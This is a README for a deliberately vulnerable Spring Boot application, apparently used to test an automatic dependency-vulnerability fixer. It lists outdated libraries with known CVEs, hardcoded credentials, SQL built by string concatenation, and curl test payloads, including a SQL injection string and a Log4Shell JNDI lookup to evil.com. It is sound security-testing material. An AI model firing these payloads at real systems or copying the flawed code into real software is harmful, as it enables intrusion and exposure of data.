# Vulnerable Spring Boot Application

This is an **intentionally vulnerable** Spring Boot application created for testing the Automatic Java SCA Vulnerability Fixer.

## ⚠️ WARNING

**DO NOT deploy this application in production or any public environment!**
This application contains known security vulnerabilities for testing purposes only.

---

## SCA Vulnerabilities (Outdated Dependencies)

### 1. Spring Boot 2.5.0
- **Current Version**: 2.5.0 (May 2021)
- **Known CVEs**: CVE-2021-22118, CVE-2021-22119, and others
- **Fixed Version**: 2.7.x or later (preferably 3.x)

### 2. Log4j 2.14.0
- **Current Version**: 2.14.0
- **Known CVEs**:
  - CVE-2021-44228 (Log4Shell - Critical RCE)
  - CVE-2021-45046
- **Fixed Version**: 2.17.1 or later

### 3. Jackson Databind 2.12.3
- **Current Version**: 2.12.3
- **Known CVEs**: CVE-2020-36518 and others
- **Fixed Version**: 2.13.0 or later

### 4. Apache Commons Text 1.9
- **Current Version**: 1.9
- **Known CVEs**: CVE-2022-42889 (Text4Shell)
- **Fixed Version**: 1.10.0 or later

---

## SAST Vulnerabilities (Code Issues)

### 1. Hardcoded Credentials
**Location**: `UserService.java:18-20`
```java
private static final String ADMIN_PASSWORD = "admin123456";
private static final String DB_PASSWORD = "P@ssw0rd2024";
private static final String API_KEY = "sk_live_51234567890abcdefghijklmnop";
```

### 2. SQL Injection
**Location**: `UserService.java:32-36`
```java
public List<User> searchUsersByName(String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    Query query = entityManager.createNativeQuery(sql, User.class);
    return query.getResultList();
}
```

**Location**: `UserService.java:39-43`
```java
public List<User> searchUsersByRole(String role) {
    String sql = "SELECT u FROM User u WHERE u.role = '" + role + "'";
    Query query = entityManager.createQuery(sql);
    return query.getResultList();
}
```

---

## Building and Running

```bash
cd vulnerable-app
mvn clean install
mvn spring-boot:run
```

The application will start on `http://localhost:8080`

---

## API Endpoints

- `GET /api/users` - Get all users
- `GET /api/users/{id}` - Get user by ID
- `GET /api/users/search?username=john` - Search users (SQL Injection vulnerable)
- `GET /api/users/role/{role}` - Get users by role (SQL Injection vulnerable)
- `POST /api/users` - Create user
- `POST /api/users/login?username=admin&password=admin123456` - Login (Log4Shell vulnerable)

---

## Testing Vulnerabilities

### SQL Injection Test
```bash
curl "http://localhost:8080/api/users/search?username=john' OR '1'='1"
```

### Log4Shell Test
```bash
curl -X POST "http://localhost:8080/api/users/login?username=\${jndi:ldap://evil.com/a}&password=test"
```

---

## Next Steps

This application will be used to test the **Automatic Java SCA Vulnerability Fixer** system.
